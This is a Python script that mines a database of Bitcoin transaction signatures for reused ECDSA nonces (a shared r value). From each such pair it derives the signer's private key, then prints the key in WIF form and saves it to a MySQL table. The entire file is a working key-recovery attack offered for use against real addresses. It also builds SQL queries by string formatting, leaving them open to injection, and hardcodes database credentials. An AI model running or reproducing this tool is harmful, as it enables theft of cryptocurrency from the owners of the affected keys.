#!/usr/bin/env python
import sqlite3,hashlib,sys,MySQLdb
from optparse import OptionParser


count = 0

dbms = 'mysql'
db = 'hashes'
db_user = 'hashes'
db_password = 'hashes'
db_server = '127.0.0.1'
table = 'hashes'

p = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141

def hexify (s, flip=False):
    if flip:
        d = s[::-1].encode('hex').zfill(64)
    else:
        d = s.encode('hex').zfill(64)
    return d

def unhexify (s, flip=False):
    if flip:
        return s.decode ('hex')[::-1]
    else:
        return s.decode ('hex')

def inttohexstr(i):
	tmpstr = "%s" % hex(i)
	hexstr = tmpstr.replace('0x','').replace('L','').zfill(64)
	
	return hexstr

b58_digits = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'

def dhash(s):
    return hashlib.sha256(hashlib.sha256(s).digest()).digest()

def rhash(s):
    h1 = hashlib.new('ripemd160')
    h1.update(hashlib.sha256(s).digest())
    return h1.digest()

def base58_encode(n):
    l = []
    while n > 0:
        n, r = divmod(n, 58)
        l.insert(0,(b58_digits[r]))
    return ''.join(l)

def base58_encode_padded(s):
    res = base58_encode(int('0x' + s.encode('hex'), 16))
    pad = 0
    for c in s:
        if c == chr(0):
            pad += 1
        else:
            break
    return b58_digits[0] * pad + res

def base58_check_encode(s, version=0):
    vs = chr(version) + s
    check = dhash(vs)[:4]
    return base58_encode_padded(vs + check)

def base58_check_encode2(s,version,compressed):
	if (compressed):
		payload = s + chr(1)
	else:	
		payload = s
	return base58_check_encode(payload,version)


def inverse_mult(a,b,p):
	#print a,b,p
	y = (a * pow(b,p-2,p)) #(pow(x, y) modulo z) where z should be a prime number
	return y

# here is the wrock!
def derivate_privkey(p,r,s1,s2,z1,z2):
	point = inverse_mult(((z1*s2) - (z2*s1)),(r*(s1-s2)),p)
	privkey = (point % int(p))
	return privkey

def try_insert(cursor,sql):
	try:
		cursor.execute(sql)
	except MySQLdb.IntegrityError as e:
		#print "%s -> %s" % (sql,e)
		pass

def try_encodeb58_Privkey(privkey,cursor):
	if (privkey > 0 and privkey < p):
        	hexprivkey = inttohexstr(privkey)
		print ("privkey = %d" % privkey)
		print ("hexprivkey = %s" % hexprivkey)
		try:
			#print len(hexprivkey)
			binprivkey = hexprivkey.decode('hex')
			wif = base58_check_encode2(binprivkey,128,False)
			print "WIF Privkey: %s" % wif
			try_insert(cursor, "insert into privkeys values ('%s','%s')" % (hexprivkey,wif))
			wif = base58_check_encode2(binprivkey,128,True)
			print "WIF Privkey: %s (compressed)" % wif
			try_insert(cursor, "insert into privkeys values ('%s','%s')" % (hexprivkey,wif))

			#print sql
			return True
		except:
			print "Failed to encode privkey in base58 maybe it's outside the curve..."
			return False
	else:
		"Error Privkey result: 0"
		return False

def print_r(r1,s1,s2,hash1,hash2):
	print "r1 %s" % inttohexstr(r1)
	print "s1 %s" % inttohexstr(s1)
	print "s2 %s" % inttohexstr(s2)
	print "hash1 %s" % inttohexstr(hash1)
	print "hash2 %s" % inttohexstr(hash2)

def proccess_set(conn,sql1,sql2):
	cursor = conn.cursor()
	cursor.execute(sql1)
	if cursor:
		cursor2 = conn.cursor()
		cursor3 = conn.cursor()
		cursor4 = conn.cursor()
		failed = []
		for row in cursor:
			sql = sql2 % row[0]
			r = row[0]
			#print sql
			cursor2.execute(sql)
			try_insert(cursor4,"insert into candidates values ('%s')" % r)
			if (cursor2):
				i = 0
				tmp = []
				for row2 in cursor2:
					tmp.append(row2)
					i+=1

				if (i > 1):
					for i in xrange(0,len(tmp)/2):
						j=i
						k=i+1
						if (tmp[j] and tmp[k]):
							r1 = int(row[0],16)
							s1 = int(tmp[j][2],16)
							s2 = int(tmp[k][2],16)
							hash1 = int(tmp[j][3],16)
							hash2 = int(tmp[k][3],16)

							#print_r(r1,s1,s2,hash1,hash2)
							d = (s1-s2)
							f = (s2-s1)

							if (s1 != s2):				
								print "r: %s" % r
								privkey = derivate_privkey(p,r1,s1,s2,hash1,hash2)
								#privkey = derivate_privkey(p,r1,s2,s1,hash2,hash1)
								failed = (try_encodeb58_Privkey(privkey,cursor3) == False)
							else:
								print "Error Privkey not computable s1 == s2\n d:%s f:%s" % (hex(d),hex(f))
								failed = True
							#if failed:
							#	try_insert(cursor3,"insert into failed ('%s')" % r1)


		#return failed

def main():
	failed = []
	parser = OptionParser()
  	parser.add_option("-r",dest="r", help="specify an r")
        (options,args) = parser.parse_args()

	#sql1 = "select r,count(r) as cr,count(s) as cs from results group by r,s having cr > 1 and cs > 1 order by r,s;"

	if options.r:
		sql1 = "select * from candidates where r = '%s'" % options.r
	else:
		sql1 = "select r,count(r) as cr from hashes group by r having cr > 1 order by r;"

	#sql2 = "select * from results where r = '%s' limit %s" 
	#sql1 = "select * from results group by r;"
	
	sql2 = "select * from hashes where r='%s' group by s;"

	#sql1 = "select * from candidates"

	if dbms == 'slqlite':
		conn = sqlite3.connect(blockFile)	
	else:
		conn = MySQLdb.connect(db_server, db_user, db_password, db)

	conn.autocommit(True)


	failed = proccess_set(conn,sql1,sql2)

	conn.commit()	
	conn.close()

main()
